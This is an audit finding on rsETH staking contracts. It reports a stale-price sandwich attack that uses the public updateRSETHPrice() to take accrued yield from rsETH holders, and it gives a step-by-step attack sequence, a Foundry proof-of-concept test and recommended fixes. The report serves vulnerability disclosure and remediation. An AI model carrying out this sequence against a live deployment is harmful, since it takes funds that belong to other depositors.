Audit Report

## Title
Stale `rsETHPrice` Sandwich Attack Enables Theft of Yield from rsETH Holders — (`contracts/LRTOracle.sol`, `contracts/LRTDepositPool.sol`, `contracts/LRTWithdrawalManager.sol`)

## Summary

`LRTOracle.rsETHPrice` is a stored value updated only when `updateRSETHPrice()` is explicitly called, and that function is unrestricted (`public`). An attacker can deposit at the stale low price to receive excess rsETH, trigger the price update, then immediately redeem at the corrected higher price — extracting the accrued yield that should have been distributed pro-rata to all existing rsETH holders.

## Finding Description

**Root cause:** `rsETHPrice` is a lazily-updated storage variable. Between oracle updates, staking rewards accrue inside EigenLayer strategies, causing the true per-share value to exceed the stored price. Both minting and redemption consume this same stale value.

**Deposit path** — `LRTDepositPool.getRsETHAmountToMint` (`contracts/LRTDepositPool.sol`, L520):
```solidity
rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
```
When `rsETHPrice` is stale-low, the attacker receives more rsETH than the true exchange rate warrants. [1](#0-0) 

**Withdrawal path** — `LRTWithdrawalManager.getExpectedAssetAmount` (`contracts/LRTWithdrawalManager.sol`, L593):
```solidity
underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
```
After the price update, the same rsETH balance redeems for more assets. [2](#0-1) 

**Price update is unrestricted** — `LRTOracle.updateRSETHPrice` (`contracts/LRTOracle.sol`, L87):
```solidity
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```
Any EOA can call this at will. [3](#0-2) 

**`pricePercentageLimit` guard is insufficient:** The guard at `_updateRsETHPrice` only reverts an unprivileged caller when the price increase exceeds `pricePercentageLimit`. For normal reward accruals that fall within the limit (or when `pricePercentageLimit == 0`, which disables the check entirely), the attacker can freely call `updateRSETHPrice()`. [4](#0-3) 

**Instant withdrawal path collapses the attack into a single transaction:** When `isInstantWithdrawalEnabled[asset]` is true, `instantWithdrawal` calls `getExpectedAssetAmount` at the current (now-updated) price and immediately transfers assets, eliminating the 8-day capital lock-up entirely. [5](#0-4) 

**Non-instant withdrawal path:** `initiateWithdrawal` locks `expectedAssetAmount` at the high post-update price. During `unlockQueue`, `_calculatePayoutAmount` returns `min(expectedAssetAmount, currentReturn)`. If the price remains at or above the initiation price, the attacker receives the full locked-in high amount. [6](#0-5) 

**Full attack sequence:**
1. Observe that `rsETHPrice` is stale (rewards have accrued but `updateRSETHPrice()` has not been called).
2. Call `LRTDepositPool.depositETH{value: X}(0, "")` — receives `X / P_stale` rsETH, which is more than the fair `X / P_true`.
3. Call `LRTOracle.updateRSETHPrice()` — price jumps from `P_stale` to `P_true`.
4a. *(Instant path)* Call `LRTWithdrawalManager.instantWithdrawal(ETH, rsETHAmount, "")` — receives `rsETHAmount * P_true` ETH minus fee, netting `X * (P_true/P_stale - 1)` profit minus fee.
4b. *(Queued path)* Call `initiateWithdrawal` to lock in `expectedAssetAmount` at `P_true`, wait `withdrawalDelayBlocks`, then `completeWithdrawal`.

## Impact Explanation

The attacker mints rsETH at a below-fair-value price (diluting all existing holders) and redeems at the corrected fair-value price. The delta — the accrued yield that should have been distributed pro-rata to existing holders — is instead captured by the attacker. This is **theft of unclaimed yield** (High severity). On a protocol with large TVL, even a 0.05% stale-price gap represents a meaningful absolute profit, and the attack is repeatable every oracle update cycle.

## Likelihood Explanation

`updateRSETHPrice()` is not called on every block; it is triggered off-chain by operators or bots. Any interval between calls during which staking rewards accrue creates the exploitable window. The attack requires no special permissions, no governance capture, and no external oracle manipulation — only the ability to observe the mempool for pending price-update transactions or to time deposits around known reward accrual events. The `pricePercentageLimit` guard limits the per-update price jump but does not prevent the attack for normal reward accruals within the limit, and is entirely disabled when `pricePercentageLimit == 0`.

## Recommendation

1. **Trigger `updateRSETHPrice()` atomically inside `depositETH` and `depositAsset`** to ensure the price is always fresh at deposit time, eliminating the stale-price minting advantage.
2. **Enforce a deposit-to-withdrawal cooldown** requiring that rsETH minted in a given block cannot be used to initiate a withdrawal until at least one oracle update cycle has passed.
3. **Calibrate `instantWithdrawalFee`** to be at least as large as the maximum possible stale-price gap (bounded by `pricePercentageLimit`) to make the instant-withdrawal attack path unprofitable.
4. **Restrict `updateRSETHPrice()`** to privileged callers (e.g., `onlyLRTOperator`) to prevent attackers from triggering the price update themselves as part of the sandwich.

## Proof of Concept

```solidity
function test_sandwich_rsETH_price_update() external {
    // Alice is an existing rsETH holder
    vm.deal(alice, 500 ether);
    vm.prank(alice);
    lrtDepositPool.depositETH{value: 500 ether}(0, "");

    // Simulate staking rewards accruing (increasing total ETH in protocol)
    _simulateRewardAccrual(1 ether);

    // Step 1: Attacker deposits at stale low price → receives excess rsETH
    vm.deal(attacker, 10 ether);
    vm.prank(attacker);
    lrtDepositPool.depositETH{value: 10 ether}(0, "");
    uint256 rsETHReceived = rsETH.balanceOf(attacker);

    // Step 2: Update rsETHPrice to reflect accrued rewards (public, no access control)
    lrtOracle.updateRSETHPrice();

    // Step 3a (instant path): Attacker withdraws at new high price
    vm.prank(attacker);
    rsETH.approve(address(lrtWithdrawalManager), rsETHReceived);
    vm.prank(attacker);
    lrtWithdrawalManager.instantWithdrawal(ETH_TOKEN, rsETHReceived, "");

    int256 profit = int256(attacker.balance) - int256(10 ether);
    assertGt(profit, 0); // attacker profited at expense of alice and other holders
}
```

### Citations

**File:** contracts/LRTDepositPool.sol (L519-521)
```text
        // calculate rseth amount to mint based on asset amount and asset exchange rate
        rsethAmountToMint = (amount * lrtOracle.getAssetPrice(asset)) / lrtOracle.rsETHPrice();
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L228-233)
```text
        uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
        IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
        ILRTUnstakingVault unstakingVault = ILRTUnstakingVault(lrtConfig.getContract(LRTConstants.LRT_UNSTAKING_VAULT));
        if (assetAmountUnlocked > unstakingVault.getAssetsAvailableForInstantWithdrawal(asset)) {
            revert CantInstantWithdrawMoreThanAvailable();
        }
```

**File:** contracts/LRTWithdrawalManager.sol (L589-594)
```text
        // setup oracle contract
        ILRTOracle lrtOracle = ILRTOracle(lrtConfig.getContract(LRTConstants.LRT_ORACLE));

        // calculate underlying asset amount to receive based on rsETH amount and asset exchange rate
        underlyingToReceive = amount * lrtOracle.rsETHPrice() / lrtOracle.getAssetPrice(asset);
    }
```

**File:** contracts/LRTWithdrawalManager.sol (L824-835)
```text
    function _calculatePayoutAmount(
        WithdrawalRequest storage request,
        uint256 rsETHPrice,
        uint256 assetPrice
    )
        private
        view
        returns (uint256)
    {
        uint256 currentReturn = (request.rsETHUnstaked * rsETHPrice) / assetPrice;
        return (request.expectedAssetAmount < currentReturn) ? request.expectedAssetAmount : currentReturn;
    }
```

**File:** contracts/LRTOracle.sol (L87-89)
```text
    function updateRSETHPrice() public whenNotPaused {
        _updateRsETHPrice();
    }
```

**File:** contracts/LRTOracle.sol (L252-267)
```text
        if (newRsETHPrice > highestRsethPrice) {
            // check if the price is above the threshold
            uint256 priceDifference = newRsETHPrice - highestRsethPrice;
            // pricePercentageLimit is in 1e18 precision (100% = 1e18, 1% = 1e16)
            bool isPriceIncreaseOffLimit =
                pricePercentageLimit > 0 && priceDifference > pricePercentageLimit.mulWad(highestRsethPrice);

            // check if the price difference is above the threshold
            if (isPriceIncreaseOffLimit) {
                // if sender has a manager role, this doesn't revert.
                // if not, it reverts as price went above the threshold
                if (!IAccessControl(address(lrtConfig)).hasRole(LRTConstants.MANAGER, msg.sender)) {
                    revert PriceAboveDailyThreshold();
                }
            }
        }
```
